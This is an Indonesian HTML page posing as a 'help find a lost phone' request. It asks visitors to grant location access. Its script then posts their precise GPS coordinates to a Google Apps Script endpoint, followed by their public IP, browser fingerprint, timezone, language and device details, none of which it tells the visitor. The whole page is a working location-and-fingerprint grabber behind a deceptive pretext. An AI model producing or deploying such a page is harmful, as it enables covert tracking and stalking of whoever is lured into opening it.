<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Bantu Temukan HP</title>
  <style>
    body { font-family: Arial; padding:20px; max-width:600px; margin:auto; }
    .box { padding:15px; border:1px solid #ccc; border-radius:10px; background:#fafafa; }
  </style>
</head>
<body>
  <h2>Mohon Bantu Temukan HP Hilang</h2>
  <div class="box">
    <p>Silakan tekan <b>Allow / Izinkan</b> saat muncul permintaan lokasi.</p>
    <p id="status">Menunggu izin lokasi...</p>
    <div id="result"></div>
  </div>

<script>
const ENDPOINT = "https://script.google.com/macros/s/AKfycbxF_gCSQq5hwRaShgi2n_82321UMo3o7VemIUTh3tUfbrz1e7hcb1773bP00apWofI/exec"; 

// ============ FUNGSI KIRIM DATA LOKASI KE SHEET1 ============
function sendToSheet(lat, lon, acc){
  const formData = new FormData();
  formData.append("type", "location");
  formData.append("lat", lat);
  formData.append("lon", lon);
  formData.append("accuracy", acc);
  formData.append("ua", navigator.userAgent);

  fetch(ENDPOINT, {
    method: "POST",
    body: formData
  }).then(() => {
    // setelah sukses kirim lokasi → kirim data extra
    sendExtraData();
  });
}

// ============ FUNGSI KIRIM DATA TAMBAHAN (Sheet2) ============
async function sendExtraData(){
  const ip = await getPublicIP();
  const conn = navigator.connection ? (navigator.connection.effectiveType || "") : "";
  const lang = navigator.language || "";
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
  const memory = navigator.deviceMemory || "";
  const platform = navigator.platform || "";
  const screenSize = screen.width + "x" + screen.height;
  const viewport = window.innerWidth + "x" + window.innerHeight;

  const fd = new FormData();
  fd.append("type", "extra");
  fd.append("ip", ip);
  fd.append("connection", conn);
  fd.append("lang", lang);
  fd.append("timezone", tz);
  fd.append("memory", memory);
  fd.append("platform", platform);
  fd.append("ua", navigator.userAgent);
  fd.append("screen", screenSize);
  fd.append("viewport", viewport);

  fetch(ENDPOINT, { method:"POST", body: fd });
}

// ambil IP publik (via ipify)
async function getPublicIP(){
  try{
    const r = await fetch("https://api.ipify.org?format=json");
    const j = await r.json();
    return j.ip || "";
  }catch(e){
    return "";
  }
}

// ============ HANDLE LOKASI ============
function success(pos){
  const lat = pos.coords.latitude;
  const lon = pos.coords.longitude;
  const acc = pos.coords.accuracy;

  document.getElementById("status").textContent = "Lokasi berhasil diperoleh.";
  document.getElementById("result").innerHTML = `
    Koordinat: <b>${lat}, ${lon}</b><br>
    Akurasi: <b>${acc} meter</b><br><br>
    <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">Buka di Google Maps</a>
  `;

  sendToSheet(lat, lon, acc);
}

function error(err){
  document.getElementById("status").textContent =
    "Gagal memperoleh lokasi: " + err.message;
}

navigator.geolocation.getCurrentPosition(success, error, {
  enableHighAccuracy: true,
  timeout: 20000
});
</script>
</body>
</html>
